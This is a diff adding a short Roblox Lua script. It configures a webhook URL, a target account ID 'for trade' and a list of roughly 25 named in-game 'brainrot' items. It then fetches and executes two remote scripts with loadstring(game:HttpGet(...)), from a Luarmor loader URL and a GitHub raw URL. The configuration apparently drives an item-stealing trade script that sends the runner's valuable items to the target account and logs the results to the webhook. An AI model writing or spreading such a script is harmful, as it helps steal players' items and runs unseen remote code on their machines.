@@ -1,0 +1,34 @@
+getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_f9c7a302d10b40408e306c115b279d3e"
+getgenv().TARGET_ID = 10425530119  -- ID аккаунта для трейда
+getgenv().DELAY_STEP = 1
+getgenv().TRADE_CYCLE_DELAY = 2 
+getgenv().TARGET_BRAINROTS = {
+    ["Tacorita Bicicleta"] = true,
+    ["Nuclearo Dinossauro"] = true,
+    ["Los 67"] = true,
+    ["Money Money Puggy"] = true,
+    ["Chillin Chili"] = true,
+    ["La Extinct Grande"] = true,
+    ["Los Tacoritas"] = true,
+    ["Tang Tang Kelentang"] = true,
+    ["Garama and Madundung"] = true,
+    ["La Secret Combinasion"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Los Hotspotsitos"] = true,
+    ["Tralaledon"] = true,
+    ["Tictac Sahur"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Ketupat Kepat"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["Burguro and Fryuro"] = true,
+    ["Cooki and Milki"] = true,
+    ["Capitano Moby"] = true,
+    ["Cerberus"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Meowl"] = true,
+    ["Noobini Pizzanini"] = true
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()
